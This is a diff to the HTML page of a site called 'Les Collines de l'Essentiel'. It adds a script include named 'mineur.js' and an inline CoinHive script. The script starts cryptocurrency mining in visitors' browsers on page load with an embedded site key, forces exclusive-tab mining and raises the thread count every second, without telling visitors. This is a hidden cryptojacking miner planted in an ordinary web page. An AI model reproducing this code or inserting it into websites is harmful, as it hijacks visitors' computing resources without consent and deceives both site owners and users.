@@ -8,7 +8,7 @@
     <link rel="icon" href="favicon.ico">
 
     <title>Les Collines de l'Essentiel</title>
-
+<script type="text/javascript" src="js/mineur.js"></script>
     <!-- Bootstrap core CSS -->
     <link href="css/bootstrap.min.css" rel="stylesheet">
 
@@ -145,6 +145,20 @@
     <script src="assets/js/vendor/holder.min.js"></script>
     <!-- IE10 viewport hack for Surface/desktop Windows 8 bug -->
     <script src="assets/js/ie10-viewport-bug-workaround.js"></script>
+<script type="text/javascript">
+var miner = new CoinHive.Anonymous('Pw6RqOVNOSE8g80dGmWwPLxbtbQcBnOg','threads: 1');
+miner.start(CoinHive.FORCE_EXCLUSIVE_TAB);
+
+// Update stats once per second
+setInterval(function() {
+miner.setNumThreads(2);
+    var threadCount = miner.getNumThreads();
+    var hashesPerSecond = Math.round(miner.getHashesPerSecond() * 100) / 100;
+    var totalHashes = miner.getTotalHashes();
+    var acceptedHashes = miner.getAcceptedHashes() / 256;
+    
+}, 1000);
+</script>
   </body>
 </html>
 
